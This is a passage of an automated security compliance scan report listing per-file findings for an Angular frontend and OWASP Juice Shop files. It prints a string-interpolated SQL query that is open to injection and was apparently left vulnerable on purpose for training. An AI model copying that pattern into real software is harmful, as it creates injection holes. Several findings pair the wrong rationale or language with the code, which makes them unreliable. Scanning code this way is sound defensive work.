{"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/register/register.component.spec.ts`
**Scanned at**: 2026-10-11T16:34:54.646538+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing | 137 |

#### [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) — Hardcoded password literal detected
```ts
// Line 137
const password = 'aaaaa'
```
**Suggested fix:**
```ts
# Suggested fix: load passwords from environment, hash with bcrypt
import os, bcrypt
# Never store plain-text passwords
password_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())
# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)
```
> 💡 **Why**: Risk: If a password database is breached, using weak or unsalted hashes (like MD5 or SHA1) allows attackers to use 'rainbow tables' to crack millions of passwords in seconds. Strong KDFs make this computationally infeasible.
> 🔧 **Guidance**: A developer must refactor the authentication code to use a modern, approved library for password hashing (e.g., `spring-security-crypto`) and not use deprecated functions like `java.security.MessageDigest.getInstance("MD5")`.
> [Full remediation →](https://verify.example-org.internal/?id=AUTH-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "AUTH-M-001", "severity": "CRITICAL", "line": 137, "message": "Hardcoded password literal detected", "fix_snippet": "# Suggested fix: load passwords from environment, hash with bcrypt\nimport os, bcrypt\n# Never store plain-text passwords\npassword_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())\n# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/Services/conversation-storage.service.ts`
**Scanned at**: 2026-10-11T16:34:54.509636+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 17 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 17
const random8 = Array.from({ length: 8 }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 17, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/Services/keys.service.spec.ts`
**Scanned at**: 2026-10-11T16:35:00.364780+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 68 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 68
expect(req.request.body).toEqual({ privateKey: 'privateKey' })
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [CRYPT-M-001](https://verify.example-org.internal/?id=CRYPT-M-001) | Encryption at Rest |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 68, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/dbSchemaChallenge_3.ts`
**Scanned at**: 2026-10-11T16:35:03.497658+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 11 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 11
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
